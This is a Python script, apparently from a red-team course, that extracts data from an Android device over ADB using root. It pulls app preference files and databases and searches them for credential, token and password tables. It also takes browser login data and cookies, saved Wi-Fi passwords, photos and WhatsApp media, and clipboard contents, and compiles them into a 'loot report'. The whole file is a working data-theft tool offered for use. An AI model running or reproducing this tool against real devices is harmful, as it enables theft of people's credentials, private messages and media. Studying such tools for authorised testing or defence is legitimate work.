#!/usr/bin/env python3
"""
android-data-exfil.py — Automated data extraction from Android devices via ADB.
Pulls credentials, databases, shared preferences, media, and generates a
categorized loot report.

Usage:
    python3 android-data-exfil.py [--device SERIAL] [--output DIR] [--target PACKAGE]
    python3 android-data-exfil.py --all     # extract from all third-party apps

Requires: ADB connected device (rooted for full extraction)

Part of: Red Team Academy — Android Tools
"""

import subprocess
import sys
import os
import json
import argparse
import sqlite3
import shutil
from datetime import datetime
from pathlib import Path


def run_adb(cmd, device=None, timeout=30):
    """Execute an ADB command and return stdout."""
    prefix = ["adb"]
    if device:
        prefix += ["-s", device]
    if isinstance(cmd, str):
        cmd = cmd.split()
    full_cmd = prefix + cmd
    try:
        result = subprocess.run(
            full_cmd, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", 1
    except Exception as e:
        return f"[ERROR] {e}", 1


def is_rooted(device=None):
    """Check if device has root access."""
    output, rc = run_adb("shell su -c id", device)
    return "uid=0" in output


def pull_file(remote, local, device=None):
    """Pull a file from device. Returns True on success."""
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    _, rc = run_adb(f"pull {remote} {local}", device)
    return rc == 0


def extract_shared_prefs(package, output_dir, device=None):
    """Extract SharedPreferences XML files."""
    prefs_dir = os.path.join(output_dir, "shared_prefs")
    os.makedirs(prefs_dir, exist_ok=True)

    remote_path = f"/data/data/{package}/shared_prefs/"
    files_out, _ = run_adb(f"shell su -c 'ls {remote_path}'", device)

    extracted = []
    for fname in files_out.splitlines():
        fname = fname.strip()
        if not fname or "No such file" in fname:
            continue
        local_path = os.path.join(prefs_dir, fname)
        # Read via su and redirect
        content, _ = run_adb(
            f"shell su -c 'cat {remote_path}{fname}'", device
        )
        if content and "Permission denied" not in content:
            with open(local_path, "w") as f:
                f.write(content)
            extracted.append(fname)

    return extracted


def extract_databases(package, output_dir, device=None):
    """Extract SQLite databases."""
    db_dir = os.path.join(output_dir, "databases")
    os.makedirs(db_dir, exist_ok=True)

    remote_path = f"/data/data/{package}/databases/"
    files_out, _ = run_adb(f"shell su -c 'ls {remote_path}'", device)

    extracted = []
    for fname in files_out.splitlines():
        fname = fname.strip()
        if not fname or "No such file" in fname:
            continue
        if fname.endswith("-journal") or fname.endswith("-wal") or fname.endswith("-shm"):
            continue

        # Copy to world-readable location, then pull
        temp_remote = f"/data/local/tmp/{fname}"
        run_adb(f"shell su -c 'cp {remote_path}{fname} {temp_remote}'", device)
        run_adb(f"shell su -c 'chmod 644 {temp_remote}'", device)

        local_path = os.path.join(db_dir, fname)
        if pull_file(temp_remote, local_path, device):
            extracted.append(fname)

        # Clean up
        run_adb(f"shell su -c 'rm {temp_remote}'", device)

    return extracted


def analyze_database(db_path):
    """Extract interesting data from a SQLite database."""
    findings = []
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Get all tables
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [row[0] for row in cursor.fetchall()]

        for table in tables:
            table_lower = table.lower()
            # Look for interesting tables
            interesting = [
                "user", "account", "login", "credential", "auth",
                "token", "session", "password", "key", "secret",
                "cookie", "config", "setting", "preference",
            ]
            if any(kw in table_lower for kw in interesting):
                try:
                    cursor.execute(f'SELECT * FROM "{table}" LIMIT 50')
                    columns = [desc[0] for desc in cursor.description]
                    rows = cursor.fetchall()
                    if rows:
                        findings.append({
                            "table": table,
                            "columns": columns,
                            "row_count": len(rows),
                            "sample_data": [
                                dict(zip(columns, row)) for row in rows[:5]
                            ],
                        })
                except sqlite3.Error:
                    continue

        conn.close()
    except sqlite3.Error:
        pass

    return findings


def extract_media(output_dir, device=None):
    """Extract photos, screenshots, and downloads."""
    media_dir = os.path.join(output_dir, "media")

    targets = {
        "camera": "/sdcard/DCIM/Camera/",
        "screenshots": "/sdcard/Pictures/Screenshots/",
        "downloads": "/sdcard/Download/",
        "documents": "/sdcard/Documents/",
        "whatsapp_media": "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/",
    }

    extracted = {}
    for name, remote_path in targets.items():
        local_dir = os.path.join(media_dir, name)
        os.makedirs(local_dir, exist_ok=True)

        # List files
        files_out, _ = run_adb(f"shell ls {remote_path}", device)
        if "No such file" in files_out or not files_out.strip():
            continue

        file_count = len([f for f in files_out.splitlines() if f.strip()])
        if file_count > 0:
            # Pull the directory
            _, rc = run_adb(f"pull {remote_path} {local_dir}", device)
            if rc == 0:
                extracted[name] = file_count

    return extracted


def extract_wifi_passwords(output_dir, device=None):
    """Extract saved Wi-Fi passwords (requires root)."""
    wifi_dir = os.path.join(output_dir, "wifi")
    os.makedirs(wifi_dir, exist_ok=True)

    # Modern Android stores Wi-Fi config in XML
    paths = [
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
    ]

    passwords = []
    for remote_path in paths:
        content, rc = run_adb(
            f"shell su -c 'cat {remote_path}'", device
        )
        if rc == 0 and content and "Permission denied" not in content:
            local_path = os.path.join(wifi_dir, os.path.basename(remote_path))
            with open(local_path, "w") as f:
                f.write(content)

            # Parse for SSIDs and passwords
            import re
            ssid_matches = re.findall(
                r'<string name="SSID">&quot;([^&]+)&quot;</string>', content
            )
            psk_matches = re.findall(
                r'<string name="PreSharedKey">&quot;([^&]+)&quot;</string>',
                content,
            )
            for i, ssid in enumerate(ssid_matches):
                psk = psk_matches[i] if i < len(psk_matches) else "N/A"
                passwords.append({"ssid": ssid, "psk": psk})

    return passwords


def extract_browser_data(output_dir, device=None):
    """Extract browser history, cookies, and saved passwords."""
    browser_dir = os.path.join(output_dir, "browser")
    os.makedirs(browser_dir, exist_ok=True)

    browsers = {
        "chrome": {
            "data": "/data/data/com.android.chrome/app_chrome/Default/",
            "files": ["Login Data", "Cookies", "History", "Web Data"],
        },
        "firefox": {
            "data": "/data/data/org.mozilla.firefox/files/mozilla/",
            "files": ["logins.json", "cookies.sqlite", "places.sqlite"],
        },
    }

    extracted = {}
    for browser, config in browsers.items():
        browser_out = os.path.join(browser_dir, browser)
        os.makedirs(browser_out, exist_ok=True)

        for fname in config["files"]:
            remote = os.path.join(config["data"], fname)
            temp = f"/data/local/tmp/{fname.replace(' ', '_')}"
            run_adb(f"shell su -c 'cp \"{remote}\" {temp}'", device)
            run_adb(f"shell su -c 'chmod 644 {temp}'", device)

            local = os.path.join(browser_out, fname)
            if pull_file(temp, local, device):
                if browser not in extracted:
                    extracted[browser] = []
                extracted[browser].append(fname)

            run_adb(f"shell su -c 'rm {temp}'", device)

    return extracted


def extract_clipboard(device=None):
    """Read current clipboard contents."""
    output, _ = run_adb(
        "shell su -c 'service call clipboard 2 s16 com.android.shell'",
        device,
    )
    return output


def generate_loot_report(data, output_dir):
    """Generate a categorized loot report."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # JSON
    json_path = os.path.join(output_dir, f"loot_report_{timestamp}.json")
    with open(json_path, "w") as f:
        json.dump(data, f, indent=2, default=str)

    # Text
    txt_path = os.path.join(output_dir, f"loot_report_{timestamp}.txt")
    with open(txt_path, "w") as f:
        f.write("=" * 70 + "\n")
        f.write("  ANDROID DATA EXTRACTION — LOOT REPORT\n")
        f.write(f"  Generated: {datetime.now().isoformat()}\n")
        f.write("=" * 70 + "\n\n")

        if data.get("wifi_passwords"):
            f.write("## WI-FI PASSWORDS\n")
            for wp in data["wifi_passwords"]:
                f.write(f"  SSID: {wp['ssid']}  PSK: {wp['psk']}\n")
            f.write("\n")

        if data.get("db_findings"):
            f.write("## DATABASE FINDINGS\n")
            for pkg, findings in data["db_findings"].items():
                f.write(f"\n  Package: {pkg}\n")
                for finding in findings:
                    f.write(f"    Table: {finding['table']} ({finding['row_count']} rows)\n")
                    f.write(f"    Columns: {', '.join(finding['columns'])}\n")
                    if finding.get("sample_data"):
                        for row in finding["sample_data"][:2]:
                            f.write(f"    Sample: {json.dumps(row, default=str)[:200]}\n")
            f.write("\n")

        if data.get("browser_data"):
            f.write("## BROWSER DATA\n")
            for browser, files in data["browser_data"].items():
                f.write(f"  {browser}: {', '.join(files)}\n")
            f.write("\n")

        if data.get("media"):
            f.write("## MEDIA FILES\n")
            for category, count in data["media"].items():
                f.write(f"  {category}: {count} files\n")
            f.write("\n")

        if data.get("apps_extracted"):
            f.write("## APPS DATA EXTRACTED\n")
            for pkg, details in data["apps_extracted"].items():
                f.write(f"\n  {pkg}:\n")
                if details.get("prefs"):
                    f.write(f"    SharedPrefs: {', '.join(details['prefs'])}\n")
                if details.get("dbs"):
                    f.write(f"    Databases: {', '.join(details['dbs'])}\n")

    print(f"\n[+] Loot report saved:")
    print(f"    {txt_path}")
    print(f"    {json_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Android Data Extraction via ADB"
    )
    parser.add_argument(
        "--device", "-d", help="Target device serial"
    )
    parser.add_argument(
        "--output", "-o", default="./android_loot",
        help="Output directory"
    )
    parser.add_argument(
        "--target", "-t", help="Target specific package name"
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Extract from all third-party apps"
    )
    parser.add_argument(
        "--media", action="store_true",
        help="Also extract media files (photos, downloads)"
    )
    parser.add_argument(
        "--wifi", action="store_true",
        help="Extract Wi-Fi passwords"
    )
    parser.add_argument(
        "--browser", action="store_true",
        help="Extract browser data"
    )
    parser.add_argument(
        "--everything", action="store_true",
        help="Extract everything possible"
    )
    args = parser.parse_args()

    print("[*] Android Data Exfiltration — Red Team Academy\n")

    # Check root
    rooted = is_rooted(args.device)
    if rooted:
        print("[+] Device is rooted — full extraction available")
    else:
        print("[!] Device is NOT rooted — limited extraction")
        print("    (Only sdcard and debuggable app data accessible)")

    os.makedirs(args.output, exist_ok=True)
    report_data = {
        "timestamp": datetime.now().isoformat(),
        "rooted": rooted,
        "apps_extracted": {},
        "db_findings": {},
    }

    # Determine target packages
    packages = []
    if args.target:
        packages = [args.target]
    elif args.all or args.everything:
        output, _ = run_adb("shell pm list packages -3", args.device)
        packages = [
            line.replace("package:", "").strip()
            for line in output.splitlines()
            if line.strip()
        ]

    # Extract per-app data
    if packages and rooted:
        print(f"\n[*] Extracting data from {len(packages)} app(s)...")
        for pkg in packages:
            print(f"  [*] {pkg}")
            pkg_dir = os.path.join(args.output, "apps", pkg)

            prefs = extract_shared_prefs(pkg, pkg_dir, args.device)
            dbs = extract_databases(pkg, pkg_dir, args.device)

            if prefs or dbs:
                report_data["apps_extracted"][pkg] = {
                    "prefs": prefs,
                    "dbs": dbs,
                }

            # Analyze databases
            if dbs:
                db_dir = os.path.join(pkg_dir, "databases")
                for db_name in dbs:
                    db_path = os.path.join(db_dir, db_name)
                    findings = analyze_database(db_path)
                    if findings:
                        report_data["db_findings"][pkg] = findings

    # Wi-Fi passwords
    if args.wifi or args.everything:
        if rooted:
            print("\n[*] Extracting Wi-Fi passwords...")
            report_data["wifi_passwords"] = extract_wifi_passwords(
                args.output, args.device
            )
            print(f"[+] Found {len(report_data['wifi_passwords'])} saved networks")

    # Browser data
    if args.browser or args.everything:
        if rooted:
            print("\n[*] Extracting browser data...")
            report_data["browser_data"] = extract_browser_data(
                args.output, args.device
            )

    # Media
    if args.media or args.everything:
        print("\n[*] Extracting media files...")
        report_data["media"] = extract_media(args.output, args.device)
        total_files = sum(report_data["media"].values())
        print(f"[+] Extracted {total_files} media files")

    # Clipboard
    report_data["clipboard"] = extract_clipboard(args.device)

    # Generate report
    generate_loot_report(report_data, args.output)


if __name__ == "__main__":
    main()
